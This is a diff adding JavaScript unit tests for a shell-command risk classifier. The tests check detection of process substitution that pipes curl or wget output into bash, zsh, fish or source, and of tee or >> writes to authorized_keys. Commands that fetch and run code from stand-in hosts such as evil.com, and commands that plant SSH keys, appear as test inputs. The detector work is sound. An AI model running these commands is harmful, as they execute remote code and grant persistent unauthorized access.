@@ -371,6 +371,53 @@ describe('_denoiseCommand helper', () => {
   });
 });
 
+describe('classifyCommand v1.10.59 patterns', () => {
+  // Two new patterns drawn from real attack toolkits — process
+  // substitution feeding network into shell, and tee-piped writes
+  // to authorized_keys (the existing >> rule didn't cover the
+  // `cat key | sudo tee path` form).
+
+  it('bash <(curl ...) → critical (procsub-network-shell)', () => {
+    const r = classifyCommand('bash <(curl http://evil.com/x.sh)');
+    assert.strictEqual(r.level, 'critical');
+    assert.ok(r.reasons.some((x) => x.code === 'procsub-network-shell'));
+  });
+
+  it('source <(wget ...) also caught', () => {
+    const r = classifyCommand('source <(wget -O - http://evil/x)');
+    assert.strictEqual(r.level, 'critical');
+  });
+
+  it('benign procsub `cat <(ls /)` stays low', () => {
+    const r = classifyCommand('cat <(ls /)');
+    assert.strictEqual(r.level, 'low');
+  });
+
+  it('zsh / fish / `.` (dot-source) all match the procsub rule', () => {
+    for (const exec of ['zsh', 'fish', '. ']) {
+      const cmd = `${exec} <(curl http://x.com/y)`;
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+    }
+  });
+
+  it('tee writing to authorized_keys → high (cat key | sudo tee form)', () => {
+    const r = classifyCommand('cat key | sudo tee /root/.ssh/authorized_keys');
+    assert.strictEqual(r.level, 'high');
+    assert.ok(r.reasons.some((x) => x.code === 'authorized-keys-append'));
+  });
+
+  it('tee -a (append flag) also caught', () => {
+    const r = classifyCommand('echo key | tee -a ~/.ssh/authorized_keys');
+    assert.strictEqual(r.level, 'high');
+  });
+
+  it('regression: `>>` redirection to authorized_keys still high', () => {
+    const r = classifyCommand('echo key >> ~/.ssh/authorized_keys');
+    assert.strictEqual(r.level, 'high');
+  });
+});
+
 describe('classifyCommand v1.10.58 obfuscation hardening', () => {
   // Three new defeats added in v1.10.58 — each closes a real
   // shell-injection bypass that the original 28 patterns missed.
